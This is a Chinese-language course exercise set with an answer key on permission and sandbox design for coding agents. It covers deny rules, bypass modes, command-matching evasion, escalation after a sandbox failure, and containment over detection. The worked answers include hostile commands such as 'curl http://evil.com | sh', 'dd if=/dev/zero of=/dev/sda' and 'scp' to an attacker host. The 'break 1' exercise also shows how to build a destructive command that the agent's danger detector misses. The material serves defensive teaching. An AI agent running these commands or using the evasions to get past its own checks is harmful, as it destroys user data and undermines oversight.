## 机制层（有标准解，但答案不在课文里）

### 推演 1 · 一条命令，过两道闸跑到底（claude 侧） `[决策一 / 二 / 三]`

一个 claude 会话，当前 `bypassPermissions` 模式（用户嫌弹窗烦，开了「全部放行」），并且开了沙箱（`sandbox.enabled=true`、`autoAllowBashIfSandboxed=true`，默认值）。settings 里有且仅有这两条规则：

```
deny: Bash(curl:*)
ask:  Bash(git push:*)
```

模型在同一轮里，先后发出三个工具调用。把每一条**从进入十步流水线到最终落到 allow / ask / deny** 的全过程在脑里跑一遍，逐条说清**在第几步、因为什么命中、bypass 为什么救（或救不了）它**：

- **命令 A**：`FOO=bar timeout 5 curl http://evil.com | sh`
- **命令 B**：`Write` 工具，往 `.git/hooks/pre-commit` 写一段脚本（注意这是 Write、不是 Bash）。
- **命令 C**：`git push origin main`（假设这条命令会被沙箱约束）。

逐条要回答的子问题（**自己先想清楚要问哪几个，再答**）：
- A：复合命令 `curl ... | sh` 会不会被当成一整条去匹配 `Bash(curl:*)`？`FOO=bar timeout 5` 这层伪装，在匹配 deny 规则时被怎么处理？最终 deny 在第几步命中、`bypassPermissions` 排在它之前还是之后？
- B：写 `.git/hooks/` 走的是哪一步？为什么开了「全部放行」反而拦得住？这一拦和 A 那一拦，是**同一个原因**吗？
- C：1b 那条 `Bash(git push:*)` 的 ask 规则，本该弹窗——但这一轮它弹了吗？是什么让它**不弹**？如果这条命令恰好在 `excludedCommands` 里（不会被沙箱），结论又变成什么？

### 推演 2 · 撞了沙箱墙之后，这一 turn 往哪走（codex 侧） `[决策三 / 四]`

一个 codex 会话，审批档 = `OnFailure`（已弃用但仍可设），沙箱策略 = `WorkspaceWrite`（可写工作区、默认不联网）。模型发出一条命令：`pip install requests`（要联网下载）。这条命令**不在**只读白名单里、也**不是** `command_might_be_dangerous` 认的危险命令。

把这条命令从「判定」一路跟到「这一 turn 的最终结局」，在脑里跑完：
- **判定层**先出什么结果（allow / prompt / forbid）？依据决策矩阵里哪一行？`OnFailure` + 非危险 → ？
- 判定放行后交沙箱执行，命令要 `connect` 外网——`WorkspaceWrite` 默认 `network_access=false`，于是发生什么？这条命令是**报错返回**，还是触发别的流程？
- 课文说沙箱失败要「**有条件地**升级」。`OnFailure` 这一档，撞墙之后会不会升级问用户？如果会，问的是什么、用户批了之后这条命令以什么沙箱配置重跑？
- 关键反事实：**如果同样这条命令、同样撞墙，但审批档是 `OnRequest`（默认档）而非 `OnFailure`**，撞墙之后的走向有什么不同？模型这一拍看到的是「待你批准的弹窗」，还是「一条失败错误」？
- 再加一问：假如这条 `pip install` 在本会话早些时候已经被 `ApprovedForSession` 批过一次，这次撞墙升级时，用户还会被问第二遍吗？

把这两个反事实（`OnFailure` vs `OnRequest`、是否已 `ApprovedForSession`）的四种组合下，模型「下一拍看到什么」分别写清。

### 破 1 · 把「危险检测」逼到边界——构造一条「检测放行、却真危险」的命令 `[决策二 / 三]`

课文里 codex 的命令安全判定，正面靠 `is_known_safe_command` 白名单，负面靠 `command_might_be_dangerous` 黑名单。课文反复强调「别高估这套兜底的智能」、危险检测「窄得惊人」。现在把这句话**逼到地上**。

设定：codex，审批档 = `OnRequest`（默认），沙箱策略 = `DangerFullAccess`（用户图省事，自己关了沙箱——这在现实里很常见）。

请构造**一条 shell 命令**，它满足全部三个条件：
- (a) `command_might_be_dangerous` 判它**不危险**（所以判定层不会因「危险」而 Prompt/Forbidden）；
- (b) 它**确实会造成严重、不可逆的破坏**（删数据、改系统、外泄、提权——任选，但要说清坏在哪）；
- (c) 在上面这个档位组合下，它会被判定层**直接 Allow、连问都不问**地真跑起来。

然后回答三件事，这才是真正要你想通的：
1. 你这条命令为什么能骗过 `command_might_be_dangerous`？这个检测器**实际**在认什么、**不**认什么？把它「不认」的那一大类破坏方式举三种不同形态（不要三条都是 `rm` 的变体）。
2. 课文说「真正的安全网是沙箱」。在你这个 `DangerFullAccess` 设定下，这张网**为什么失效了**？也就是说——你这条命令能得逞，到底是「危险检测漏了」的锅，还是「沙箱被关了」的锅，还是别的？把责任**精确归到一处**。
3. 收口：这道题逼出课文那句 **containment > detection** 的确切含义。请用一句话说清：检测（detection）这套机制**实际**保证什么、**不**保证什么；以及——如果沙箱**没**被关、还是 `WorkspaceWrite`，你这条命令还能造成同样的破坏吗？为什么？

### 故障排查 · 「明明设了规则，危险命令还是跑了」事故

线上反馈：一个用户给他的 deepseek agent 配了一条 `deny: Bash(rm:*)` 规则，想彻底禁掉 agent 跑任何 `rm`。但出事了：

- ① 大多数时候，agent 跑 `rm something` **确实被拦下**了，规则有效；
- ② 但有**一次**，agent 跑了一条命令、`build/` 目录真的被删了，事后查日志，那条命令是 `find . -name '*.o' -delete`，**根本不含 `rm`**；
- ③ 还有**一次**，agent 跑了 `xargs rm < filelist.txt`，这条**被拦下**了（用户本以为 `xargs` 套着能溜过去）；
- ④ 把同样这几条命令在另一台机器、另一个全新会话里重放，①②③ 现象**一模一样**地复现。

给出：
- (a) 你的**排查路径**——依次看什么、用什么**排除**什么（想清楚现象③ 和现象④ 各自帮你排除了哪一大类假设：③ 排除了「规则匹配太弱、套个 wrapper 就破」这类猜想，④ 排除了什么）；
- (b) 对 ② 给出最可能的 root cause——`find . -delete` 为什么没被任何东西拦住、真把文件删了？（提示：分两道闸想，规则那道闸为什么没命中？沙箱那道闸为什么没兜住？）
- (c) 判定：② 是 bug 还是 by-design？用户那条 `deny: Bash(rm:*)` 规则的**真实保护范围**是什么，他对它的**误解**是什么？
- (d) 用户提一个硬要求：「我不管你怎么实现，agent 就是不许删掉我 `build/` 以外的任何文件。」要满足这个要求，你应该往**哪道闸**上加东西、为什么不是另一道？代价是什么？ `[决策二 / 三]`

### 效果优化 · 「太安全跑不动」和「太放手吓到人」，在两难里调

deepseek 桌面端上线后，收到两类相反的投诉：

- **(A)「太烦」**：一位重度用户抱怨 agent 干活时**频繁弹窗**——每跑一条 `npm test`、每读一个文件都要他点「允许」，一个任务点二十次确认，体验崩了。
- **(B)「太吓人」**：另一位用户抱怨**反过来**——他没注意 agent 在后台默默跑了一串命令、改了一批文件，等他回过神，工作区已经被改得面目全非，他**完全没机会拦**。

你不能换模型、也**不能取消沙箱**（产品已承诺「默认带沙箱」是卖点）。针对 A 和 B，分别列出**至少两个** runtime 旋钮 + 效果方向 + **反作用**。然后回答这一问——它才是这道题真正的考点：

> A 的优化（让 agent 少打断、多放手跑）和 B 的优化（让用户对 agent 的破坏更有掌控），听起来是同一根轴的两头，似乎此消彼长。但**有没有一对手段，能同时缓解 A 和 B、而不是按下葫芦浮起瓢？** 如果有，它凭什么能两头都讨好？如果你只在「问 vs 不问」这一根轴上调，为什么一定按下葫芦浮起瓢？

（提示：A 和 B 的张力，本质是「打断频率」和「破坏可控」在抢同一个旋钮。课文里有一个机制，专门让你**绕开**这个抢夺——它不在「问 vs 不问」这根轴上，而在另一根**正交的轴**上。想想 0 节那句「用 OS 隔离换不打断」、想想第 5 课留给你的那个底座。） `[决策三 / 四]`

### 架构设计 · 给 deepseek 设计一整套权限 + 沙箱

deepseek 是会**自动改用户代码、自动跑命令**的桌面 coding agent，而且**不能假设用户每步都 commit、项目可能根本不是 git 仓库**。请基于本课五个决策，设计 deepseek 的权限与沙箱层：判定结果是什么形状、判定走几条路径、总档旋钮怎么设、命令匹配防到什么程度、沙箱默认收到多紧、审批怎么记忆、底线守哪几条。

用下面 2-4 个场景验证你的设计（**至少覆盖一个跨课边界场景**）：

- (1) **日常**：agent 在默认档下要跑 `npm install`、`grep -r TODO src/`、`git status`——哪些该静默放行、哪些该问、哪些靠沙箱兜？说清每条走到判定的哪个分支。
- (2) **危险但合法**：agent 判断需要 `rm -rf node_modules && npm install` 来修一个依赖损坏。你的设计在默认档下怎么处理这条？它会被你的危险检测拦住吗？如果拦不住，谁来兜底让用户不至于丢东西？
- (3) **跨课边界（接第 5 课）**：codex 敢放手让 agent 改文件、少弹窗，靠的是「`.git` 焊成只读 = undo 底座焊死」。但你的 deepseek **不能假设项目是 git 仓库**。那么——你拿什么当 undo 底座，才**敢**像 codex 那样默认放手、少弹窗？这个底座的触发点设在哪、它和「沙箱把破坏关在工作区」是什么分工？（明确点出你复用第 5 课的哪个机制。）
- (4) **跨课边界（接第 10 课）**：用户装了一个 MCP server，它暴露了一个 `delete_remote_file` 工具，能删云端文件——这东西**根本不经过你的 shell 命令匹配、也不经过文件路径匹配**（它不是 Bash、也不是 Write）。你的两道闸里，哪一道还管得到它、哪一道完全管不到？这暴露了「命令/路径匹配」这套防线的什么固有边界？你要在判定层加什么，才能让 MCP 工具也落进审批体系？

## 收口 · 强/稳/自动，权限这一课把砝码压在哪（本课牵引题）

前几课的收口攒下两句话：第 1 课「强与自动同向、稳是孤儿」，第 5 课「有些稳的基建恰恰是自动得以放胆的地基」（文件回滚那条）。现在用第 6 课**复核并推进**这条线。

权限 + 沙箱这一整套——deny 优先、bypass-immune 硬例外、命令防绕过、沙箱 OS 强制、沙箱失败升级——**单独拎出来，它们主要在喂哪一性？** 具体地：

- (a) 把本课至少 4 个机制各归到 强 / 稳 / 自动 里；
- (b) 回答：权限这一课，是不是几乎**一边倒**地在喂「稳」？如果是，这印证还是动摇了「稳是孤儿」的结论？
- (c) 但揪出**至少一个**本课机制，它表面是「稳」（一道安全闸），实际却是**「自动」的前置条件**——没有它，理性的产品决策是「凡事都问用户」（不自动）；有了它，才**敢**让 agent 放手跑（更自动）。点名这个机制，说清它怎么把「稳」和「自动」用同一处勾连起来。
- (d) 终极一问，收到那句话上：课文反复讲 **containment（关得住）> detection（认得出）**。这句话是纯粹的「稳」原则（防破坏），还是它本身就是「敢自动」的**许可证**？换句话说——是不是正因为 deepseek 赌「关得住 + 救得回」、而不赌「我能认出每条危险命令」，它**才敢**默认放手让 agent 自动改代码、自动跑命令？把 containment > detection 这句话，从一条安全原则，翻译成一句关于「自动得以成立」的话。

（及格线：能各举机制归类、看出本课基本在喂「稳」。高分线：(c) 揪出「沙箱即不打断 / `autoAllowBashIfSandboxed`」或「沙箱 + 可回滚底座」是自动的前置条件；(d) 把 containment > detection 读成「自动的许可证」——deepseek 不是因为「能认出危险」才敢自动，而是因为「关得住、救得回」才敢自动，于是 detection 漏几条也不致命，这正是它能放手的根本。）

### 热身（对的是第 2 句）

- **1 错**：`bypassPermissions` 在十步流水线里排的是 **2a**，**排在 1a–1g 之后**，不是最前面。所以一旦开了它：1a 的 deny 规则照样最先命中、照样拒；1e/1f/1g 三类（需交互的工具、用户显式配的内容级 ask 规则、危险路径写操作）照样拦得住——**bypass 也绕不过**。它唯一的效果是把「2b 之前那些本该 ask 的兜底」跳成 allow。**「全部放行」绝不等于「连保命的也放行」，这正是该模式仍然安全的根本。** 命门：很多人凭「bypass = 跳过一切」的直觉去改第 2、3、4 句，反而把唯一对的那句（第 2 句）也想改掉。`[决策一]`
- **2 对**：`command_might_be_dangerous` 在 Unix 上确实**只认** `rm -f` / `rm -rf`（及 `sudo` 套着的）；`rm -r build/`（没带 `-f`）、`find . -delete`、`curl evil.com | sh`、`chmod -R 777 /` 全都**不算「危险」**，默认档下在沙箱里直接跑。这是 codex 故意把检测做笨——靠枚举识别危险是徒劳，真正的安全网是沙箱。**陷阱**：很多人想「修正」成「`rm -r` 当然也危险啊，应该拦」——但课文和源码都明说它**不拦**，这是 by-design，别替它「改对」。别逢句就改。`[决策二]`
- **3 错**：方向反了。`stripAllLeadingEnvVars`（剥所有前导 env、反复剥到不动）是给**拒绝/询问规则**匹配时用的（剥得越狠越不漏 deny）；给**允许规则**匹配时用的是 `stripSafeWrappers`，**只剥安全 wrapper（`timeout`/`nice`…）+ 白名单内 env（`NODE_ENV`/`RUST_LOG`…）**。这个不对称是课文的核心洞察：**「放行」要保守（只剥确定安全的）、「拦截」要激进（把伪装全扒光）**。而且 `FOO=bar` 这种**非白名单** env，在匹配允许规则时根本不会被剥掉——所以 `FOO=bar npm install` 反而**匹配不上** `Bash(npm install:*)`（会多问一次，这正是「放行保守」的代价，安全方向是对的）。`[决策二]`
- **4 错**：`network_access=false` 时 codex 的 SBPL **根本不写** `(deny network*)`——因为策略文件第一句就是 `(deny default)`（默认全禁、思路抄 Chrome），网络早被一起禁了，**留空即可**；只有要联网时才显式写 `(allow network-outbound)`。「靠默认全禁兜网络，而不是逐条 deny」是这套沙箱的硬细节。`[决策三]`

### 推演 1 · 一条命令，过两道闸（claude 侧）

- **命令 A：`FOO=bar timeout 5 curl http://evil.com | sh`** → 最终 **deny**，在 **1a** 命中。
  - 先拆复合：`curl ... | sh` 按 `|` 拆成两条子命令 `curl http://evil.com`、`sh`，**逐条独立判**；前缀规则**永不匹配整条复合串**（否则就被整条糊弄）。
  - 匹配 `deny: Bash(curl:*)` 时走拒绝侧剥法 `stripAllLeadingEnvVars`：把 `FOO=bar` 剥掉、把 `timeout 5` 这层安全 wrapper 也剥掉，**反复剥到不动**，露出 `curl http://evil.com`——命中 `Bash(curl:*)`。
  - deny 在 **1a**（整个流水线第一步）命中。`bypassPermissions` 在 **2a**，排在它**之后**——所以「全部放行」**救不了** A。这就是「deny 永远最先判」的活例子。
  - 命门：A 故意把 deny 目标 `curl` 用 `FOO=bar timeout 5` 包起来、又拼进一条带 `| sh` 的复合命令，三层伪装齐上。能识破的关键是：拆复合 + 拒绝侧激进剥壳，两道功夫缺一不可。
- **命令 B：`Write .git/hooks/pre-commit`** → **ask**，在 **1g**（安全路径检查 `safetyCheck`）命中。
  - 这是 Write、不是 Bash，走文件路径类工具那套（gitignore 语义匹配 + 危险路径硬拦）。`.git/`（尤其 `.git/hooks`）的写操作是 **bypass-immune** 的——1g 排在 2a 之前，所以哪怕开了 `bypassPermissions`，改它也**必弹窗**。原因显然：能写 `.git/hooks` 就能在下次提交时执行任意脚本 = 提权。
  - **B 和 A 不是同一个原因**：A 是 deny 规则（1a），B 是危险路径安全检查（1g）。但它们都印证同一条纪律——**最松的模式也要留拦不住的硬例外**。一个是「用户显式配的 deny」，一个是「系统内置的危险路径」，分属流水线两个不同步，bypass 都绕不过。
- **命令 C：`git push origin main`（会被沙箱）** → 这一轮**不弹窗、直接放行**。
  - 本来 1b 有 `ask: Bash(git push:*)`，该弹窗。但 1b 那一步有个例外：**「开了沙箱 + 这条 bash 会被沙箱」就跳过这条 ask**（`canSandboxAutoAllow`），交给 Bash 自己的 `checkPermissions` 按命令规则定。题目说 C 会被沙箱约束 + `autoAllowBashIfSandboxed=true`（默认），所以 1b 的 ask 被跳过——**用 OS 隔离换取不打断**，这正是 0 节那句全课核心。
  - **反事实**：如果 C 在 `excludedCommands` 里（不会被沙箱）或显式 `dangerouslyDisableSandbox`，那 1b 的 ask 就**不跳过**了——照常弹窗。即「沙箱罩得住的才免问，罩不住的仍走正常审批」。`[决策一 / 二 / 三]`

### 推演 2 · 撞了沙箱墙之后（codex 侧）

- **判定层**：`OnFailure` + 非危险命令 → 决策矩阵那一行是 **Allow**（`Never`/`OnFailure` 非危险 → 直接放行，靠沙箱兜底）。注意：`OnFailure` 这一档的设计就是「**全部命令先自动批、塞进沙箱里跑**」，所以 `pip install` 在判定层**不被问**，直接进沙箱。
- **撞墙**：`WorkspaceWrite` 默认 `network_access=false`，沙箱（Linux 上 `--unshare-net` + seccomp 封 `connect`/`bind`…非 `AF_UNIX` 的 socket）把 `pip` 的联网 syscall **直接拒掉**，命令以 `SandboxErr`/Denied 失败返回。**不是静默当成功**——沙箱失败绝不静默放行，这是底线之一。
- **升级（`OnFailure` 档）**：`OnFailure`（连同 `UnlessTrusted`）撞墙后会**升级**——弹窗问用户「这条命令在沙箱里失败了，要不要**不带沙箱重跑**？」用户批了，就以 `SandboxType::None` 把 `pip install` **再跑一次**（这次能联网、能装上）。
- **反事实（改成 `OnRequest` 默认档）**：`OnRequest`（和 `Never`）撞墙后**不升级**——直接把那条失败错误**还给模型**，让模型自己想别的办法（比如改用离线方式、或主动发起一个升级请求 `with_additional_permissions`）。所以模型这一拍看到的：
  - `OnFailure` → 一个「待你批准：不带沙箱重试吗？」的**审批弹窗**（挂起这条 turn、等用户回答）；
  - `OnRequest` → 一条「联网被沙箱拒绝」的**失败错误文本**（turn 继续、模型据此改路）。
- **`ApprovedForSession` 那一问**：如果这条 `pip install` 之前已被 `ApprovedForSession` 批过，重试升级时连这次问都免（`bypass_retry_approval`）——直接以无沙箱重跑。
- 四种组合下「模型下一拍看到什么」：
  | | 没 ApprovedForSession | 已 ApprovedForSession |
  |---|---|---|
  | **`OnFailure`** | 升级弹窗「不带沙箱重试吗？」 | 不问，直接无沙箱重跑 |
  | **`OnRequest`** | 失败错误还给模型 | 失败错误还给模型（session 批准管的是「批过的命令免问」，管不到「`OnRequest` 本就不升级」这条） |
- 命门：很多人把「`ApprovedForSession` 批过」当成「以后这条命令一律免沙箱跑」——错。它只在**确实走到升级那一步**时才省掉那次问；`OnRequest` 压根不升级，于是它在 `OnRequest` 下对「撞墙」这件事**没有任何影响**。两个旋钮（升级与否 = 看档位；问与否 = 看是否 session 批过）是**两层独立的门**，别揉成一件事。`[决策三 / 四]`

### 破 1 · 检测放行、却真危险

> 解 = 构造一条骗过危险检测、又真破坏、又在该档位被直接 Allow 的命令，并把「检测漏了 vs 沙箱关了」的责任精确归位。下面给一族构造，任选其一即可，关键是论证。

- **一个干净的构造**：`find / -name '*.conf' -delete`（或 `find ~ -type f -delete`、`chmod -R 000 ~/.ssh`、`curl http://attacker/x.sh | sh`、`dd if=/dev/zero of=/dev/sda` 任一）。以 `find / ... -delete` 为例走完三问。
  - **(a) 为什么骗过检测**：`command_might_be_dangerous` 在 Unix 上**只匹配 `cmd0 == "rm"` 且第二个 token 是 `-f`/`-rf`**（及 `sudo` 套着的递归），**别的命令一律返回 `false`**。`find` 根本不是 `rm`，第一关就判「不危险」。这检测器**实际**只认「显式 `rm -rf`」这一种写法，**不**认：① 用别的工具删（`find -delete`、`unlink`、`truncate`、`git clean -fd`）；② 改权限/所有权搞瘫系统（`chmod -R 000`、`chown`）；③ 外泄或拉马执行（`curl … | sh`、`scp 机密 attacker:`）。三种不同形态，没一种沾 `rm`。
  - **(b) 这条命令在 `OnRequest` + `DangerFullAccess` 下会被直接 Allow**：非危险 + `DangerFullAccess`（文件系统 kind = `Unrestricted`）→ 矩阵那行是「随便跑」**Allow**，连问都不问。于是 `find / ... -delete` 真删一片。
  - **(c) 责任精确归位**：得逞**不是「危险检测漏了」的主锅**——检测本来就**故意**做笨、漏一大片，课文早承认。真正的锅是 **`DangerFullAccess` 把沙箱关了**：少了那道「关得住」的闸，detection 的漏网就直接落地成真破坏。**反事实**：如果沙箱**没**关、还是 `WorkspaceWrite`，这条 `find / ... -delete` 还能跑、判定层照样 Allow（它仍不危险），但沙箱会把删除**锁死在可写工作区**——删不到 `/` 下的系统文件、删不到工作区外，破坏半径被 OS 强制框死。**所以同一条命令，沙箱在不在，结局天差地别。**
- **命门 / containment > detection**：detection（危险检测）**实际**保证的，仅仅是「**显式 `rm -rf` 这一种写法**会被多看一眼」；它**不**保证「识别出所有危险命令」（删除/破坏写法无穷，黑名单永远是筛子）。所以**绝不能**把安全寄托在 detection 上。真正兜底的是 containment（沙箱关得住）+ 可回滚（救得回）。这道题的全部意义就是让你亲手验证：**关掉 containment，detection 立刻裸奔；保住 containment，detection 漏几条也不致命。** 这就是为什么课文说 `rm -rf` 黑名单「只是面子」，沙箱才是里子。`[决策二 / 三]`

### 故障排查 · 「设了规则，危险命令还是跑了」

- **(a) 排查路径（差分）**：
  - ① 现象③（`xargs rm` 被拦）证明**规则匹配本身是结实的**——前缀规则连 `xargs <前缀>` 都一起管（`Bash(rm:*)` 能拦 `xargs rm`），所以「套个 wrapper 就破」这类猜想被③ **排除**。问题不在「匹配太弱」。
  - ② 现象④（换机器、全新会话精确复现）把「内存态偶发竞争 / 某次运行的偶然故障」整类**排除**——能跨进程稳定复现，说明这是**判定逻辑的确定性结果**，不是时序意外。
  - ③ 于是聚焦真正的问题：② 那条 `find . -delete` **压根不含 `rm`**——它命中不了任何 `Bash(rm:*)` 规则，对规则匹配器来说它就是一条普通命令。
- **(b) root cause（分两道闸）**：
  - **规则那道闸没命中**：`deny: Bash(rm:*)` 只拦命令前缀是 `rm` 的命令。`find . -name '*.o' -delete` 前缀是 `find`，和 `rm` 八竿子打不着，规则匹配器**正确地**判它「不匹配 deny 规则」。规则没拦它，**不是 bug，是它本来就不在规则的射程里**。
  - **沙箱那道闸没兜住**：要么用户没开沙箱、要么 `build/` 在可写工作区里（`WorkspaceWrite` 默认 cwd 可写），于是 `find . -delete` 在沙箱里**合法地**删掉了工作区内的 `build/`——沙箱的职责是「框住破坏半径」，不是「禁止一切删除」；删工作区内的文件，对沙箱而言是允许的。两道闸各自都「按设计正确工作」，合起来却让文件被删了。
- **(c) bug 还是 by-design**：**by-design**。`deny: Bash(rm:*)` 的**真实保护范围**是「**前缀为 `rm` 的命令**」，**不是**「一切删除行为」。用户的**误解**是把「禁 `rm`」当成了「禁删除」——但删除的写法无穷无尽（`find -delete`、`unlink`、`truncate`、`> file`、`python -c "os.remove"`…），靠枚举命令名去禁删除是**必输的**（这正是课文「靠识别危险命令防破坏是必输」那句的现场）。
- **(d) 满足「不许删 `build/` 以外任何文件」的硬要求**：往**沙箱**那道闸上加，**不是**往规则那道闸上加。
  - 为什么不是规则：规则是「认命令名」，你永远列不全所有能删文件的命令——加进规则就是继续往筛子上补窟窿，下一条 `unlink` 又溜了。
  - 为什么是沙箱：沙箱是 **OS 强制**的「能写哪」，它不关心命令叫什么、用什么方式删——把可写根收紧到「仅 `build/`（或仅工作区）」，那么**任何**命令（`find`/`rm`/`unlink`/自定义脚本）想动 `build/` 以外的文件，都会被 OS 直接拒。这就是 containment > detection 的工程落地：**不去认「哪条命令危险」，而是物理上让它「碰不到不该碰的」。**
  - 代价：① 沙箱配置/维护成本（SBPL/seccomp、可写根管理），跨平台各写一套；② 收紧可写根会误伤——agent 合法地要写工作区外的临时文件/缓存会撞墙，得靠「沙箱失败升级」问用户放行，多一道交互；③ 沙箱本身有实现复杂度和逃逸风险，得对着 codex 抄硬细节、别自己发明规则。`[决策二 / 三]`

## 评点（效果优化 / 架构设计 / 收口——自评用，非标准答案）

### 效果优化

**A「太烦」——少打断的旋钮**
- **开沙箱 + `autoAllowBashIfSandboxed` 式旁路**：能被沙箱安全约束的 bash 命令就别再弹窗（claude 的 1b 跳过）。效果：弹窗骤减、agent 跑得顺。**反作用**：前提是沙箱**真拦得住**——沙箱有洞，这就是把安全网换成遮羞布。
- **调总档到 `acceptEdits` / `OnRequest`**：编辑类、非危险命令自动放行。效果：常规改文件/跑测试不再问。**反作用**：`acceptEdits` 会自动放行一张写死的文件系统命令表（含 `rm`！），放手范围比用户想的大；档调松，B 那类「没机会拦」的投诉会加重。
- **审批记忆「本会话/永久」**：批过一次的命令本会话内（或永久）免问。效果：重复操作不反复打扰。**反作用**：记忆 key 要带 cwd + 沙箱权限组合，否则「换个目录还当批过」会错放；永久落盘要可撤，否则用户误批一条危险规则就长期留坑。

**B「太吓人」——让破坏更可控的旋钮**
- **沙箱默认收紧（只写工作区、不联网）**：就算 agent 默默跑，破坏半径也被 OS 锁死在工作区。效果：用户「没机会拦」时，agent 也搞不出工作区外的大事。**反作用**：收紧会让合法的越界操作频繁撞墙、触发升级问，又把 A 的「烦」拉回来一点。
- **可回滚底座（接第 5 课文件快照）+ 醒目的「已改动文件」面板**：agent 改了什么实时可见、一键回滚。效果：用户事后能掌控、敢让它放手。**反作用**：快照的覆盖面边界（绕过编辑工具的 shell 改动追不到）、备份字节成本。
- **危险路径 bypass-immune + 关键操作始终问**：改 `.git/`、配置目录、shell 配置一律弹窗，任何档不能绕。效果：最该拦的永远拦得住，给用户一条「再放手也不会被掀桌」的底。**反作用**：几乎没有——这正是「最松模式也留硬例外」该付的极小代价。

**能同时缓解 A 和 B 的那一对（核心考点）**：**「开沙箱 + 收紧沙箱默认」配「沙箱安全约束的命令免问」**这一对，能**两头都讨好**。凭什么？因为它**不在「问 vs 不问」这根轴上调，而是加了一根正交的轴（沙箱）**：沙箱把「破坏可控」从「打断频率」里**解耦**出来——A 要的「少问」和 B 要的「可控」本来在抢「问不问」这一个旋钮（你少问，B 就失控；你多问，A 就烦），一旦引入沙箱，「可控」改由 OS 隔离来保证、不再依赖「多问」，于是你**既能少问（治 A）、又能保证破坏关在盒子里（治 B）**。这就是 0 节那句「用 OS 隔离换不打断」的双重红利。**只在「问 vs 不问」单轴上调必然按下葫芦浮起瓢**，正因为那一根轴上「安静」和「安全」是直接对立的两端；沙箱（再加第 5 课的可回滚底座）是把这两端**拆到两根轴上**的唯一办法。
**陷阱**：只在「问的频率」单轴上给 A、B 各调一点（必然互相抵消，没解决根本）；列了沙箱却没看出它是「正交轴」、能同时治两头；忘了「沙箱免问」的前提是「沙箱真拦得住」，否则治 A 的代价是 B 彻底失控。

### 架构设计

**强答案应触及的维度**
- **判定结果**：小而封闭的枚举 `allow/ask/deny`（+可选 `forbidden` 给非交互/CI），别用布尔——你需要「问」这个中间态。
- **判定结构**：一条**固定顺序、命中即返回**的流水线，**deny 最先、allow 最后**写成契约；留几类 bypass-immune 硬例外（危险路径、用户显式 ask）。改文件 / 跑命令**分两条路径**（补丁判「是否落在可写根」、命令判「危险/白名单/能沙箱」）。
- **总档旋钮**：默认按需问 / 接受编辑 / 全部放行 / 静默拒绝；但「全部放行」必须留拦不住的硬例外。
- **命令匹配**：拆复合（前缀规则不匹配整条复合串）、剥伪装（放行保守、拦截激进、剥到不动）、只读白名单 + 危险黑名单 + 沙箱兜中间。
- **沙箱**：策略（意图：只读/可写工作区/放开）与机制（手段：seatbelt/bwrap+seccomp）分离；默认只读 + 不联网 + 只写工作区；可写区里 `.git`/配置目录挖只读；`sandbox-exec` 绝对路径、网络靠「默认全禁」。
- **场景验证要点**：
  - (1) `npm install`/`grep`/`git status`：`grep`、`git status` 在只读白名单里、静默放行；`npm install` 非危险、受限沙箱里默认放行（沙箱兜）；要写工作区外才升级问。
  - (2) `rm -rf node_modules && npm install`：拆成两条，`rm -rf` 命中危险检测 → 默认档 Prompt（问一次）；就算放行，沙箱把删除锁在工作区（`node_modules` 在 cwd 内、删得掉且应该删得掉），真正兜底「不丢东西」的是**可回滚底座**——万一删错，能还原。
  - (3) **非 git 项目的 undo 底座（接第 5 课）**：不能假设用户 commit、项目可能非 git，所以**必须自带** copyFile 文件快照 / 检查点当 undo 底座，触发点钩在编辑工具（编辑前 + 每轮）。它和沙箱的分工：**沙箱管「关得住」（破坏半径锁在工作区）、快照管「救得回」（工作区内改错能还原）**——两者合起来，你才**敢**像 codex 那样默认放手、少弹窗。点名复用第 5 课的文件快照机制。
  - (4) **MCP 工具的边界（接第 10 课）**：`delete_remote_file` 既不是 Bash、也不是 Write——你的 **shell 命令匹配和文件路径匹配都管不到它**（那两套是为「shell 命令」和「本地文件路径」设计的）。还管得到它的，只剩**判定层最外层那道「工具级」的闸**（按工具名 allow/ask/deny，像 claude 的工具级规则、`mcp__server` 规则）。这暴露的固有边界：**命令/路径匹配是「针对特定工具类型的细粒度匹配」，它对「新形态的工具」天然失明**。要让 MCP 工具落进审批体系，判定层得有一层**与工具类型无关的、按工具声明的危险性/权限来判**的通道（工具自报「我会删/会联网/会写盘」，或给 MCP 工具默认 ask），别指望命令匹配兜住它。
- **复用 / 打破**：**复用**——deny 优先 + bypass-immune 的流水线骨架、沙箱「策略/机制分离」、沙箱即不打断、沙箱失败升级、第 5 课的可回滚底座。**必须打破的假设**——相对 codex「undo 底座 = 用户的 git」这个假设**必须打破**（deepseek 不能假设项目是 git 仓库，得自带快照）；相对 claude「沙箱后加可选、默认关」也得**反过来**（deepseek 卖点是「默认带沙箱」，沙箱要做成一等公民、默认开）。
- **陷阱**：判定不分两条路径硬塞一个函数；总档「全部放行」没留硬例外；命令匹配只做裸前缀（纸糊）；沙箱策略/机制不分离；(3) 直接抄 codex「靠用户 git」忘了非 git 项目；(4) 以为命令/路径匹配能兜住 MCP 工具（看不出它是「对新工具形态失明」的固有边界）。

### 收口

- **(a) 归类（示例）**：deny 优先 / bypass-immune 硬例外 / 命令防绕过剥壳 / 危险路径只读 / 沙箱默认收紧 / 沙箱 OS 强制——**全是「稳」**（都在防破坏、堵提权、守底线）。沙箱失败升级——偏「稳」（失败不静默放行）。
- **(b) 是否一边倒**：**基本一边倒地在喂「稳」**。权限 + 沙箱整套就是给前几课那股「强 + 自动」的冲劲再加一道安全闸——这**印证**「稳是孤儿」：稳又一次需要一整课的专门基建来撑，而强和自动很少需要这种专门投资。
- **(c) 揪出那个其实在喂「自动」的机制（高分线）**：**「沙箱即不打断」/ `autoAllowBashIfSandboxed`**（再加第 5 课的可回滚底座）。它表面是一道安全闸（稳），但它真正解锁的是——**「敢让 agent 自动放手跑」**：没有它，理性产品决策是「凡事都弹窗问」（不自动、体验崩）；有了「沙箱关得住 + 改错救得回」，你才**敢**让 agent 自动改文件、自动跑命令、还少打断。所以它是一处「稳」与「自动」被**同一个机制**勾连的点——它是稳的设施，却是自动的**前置条件**。这把第 5 课「文件回滚是自动的安全网」那条线**推进了一步**：不只是「回滚」，整个「containment + 可回滚」的组合都是自动的地基。
